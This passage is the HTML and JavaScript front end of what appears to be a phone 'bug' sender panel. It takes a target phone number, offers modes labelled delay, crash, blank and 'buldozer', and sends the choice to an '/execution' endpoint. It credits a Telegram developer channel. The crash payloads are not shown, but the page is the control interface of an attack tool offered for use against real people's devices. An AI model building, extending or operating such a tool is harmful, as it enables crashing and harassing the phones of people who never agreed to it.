    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://files.catbox.moe/z7xdq5.png" alt="Logo" class="logo" />
    <div class="username">Olá, ${username || 'Anônimo'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" id="numberInput" placeholder="Please input target number. example : +628xxxxxxx or 628xxxxxxx or +1202xxxxxxx" />

    <div class="select-wrapper">
      <select id="modeSelect">
        <option value="" disabled selected>---Select Bugs---</option>
        <option value="AndrosDelay">S-P DELAY</option>
        <option value="AndrosDelay">S-P DELAY HARD</option>
        <option value="AndrosDelay">S-P BULDOZER</option>
        <option value="AndrosDelay">S-P BULDOZER HARD</option>
        <option value="AndrosDelay">S-P CRASH</option>
        <option value="AndrosDelay">S-P BLANK</option>
        <option value="AndrosDelay">S-P COMBO DELAY</option>
      </select>
    </div>

    <button class="execute-button" id="executeBtn" disabled>
      <i class="fas fa-moon"></i> EXECUTE
    </button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/DryzxModders" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Desconhecido'}
        <span style="color:#ff4444; font-weight:bold;">&nbsp;•&nbsp;</span>
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <script>
  const inputField = document.getElementById('numberInput');
  const modeSelect = document.getElementById('modeSelect');
  const executeBtn = document.getElementById('executeBtn');

  function isValidNumber(number) {
    const pattern = /^\\+?\\d{7,20}$/;
    return pattern.test(number);
  }

  function toggleButton() {
    const number = inputField.value.trim().replace(/\\s+/g, '');
    const selectedMode = modeSelect.value;
    executeBtn.disabled = !(isValidNumber(number) && selectedMode);
  }

  inputField.addEventListener('input', toggleButton);
  modeSelect.addEventListener('change', toggleButton);

  executeBtn.addEventListener('click', () => {
    const number = inputField.value.trim().replace(/\\s+/g, '');
    const selectedMode = modeSelect.value;
    window.location.href = '/execution?mode=' + selectedMode + '&target=' + encodeURIComponent(number);
  });

  toggleButton();
  </script>
</body>
</html>`;
};
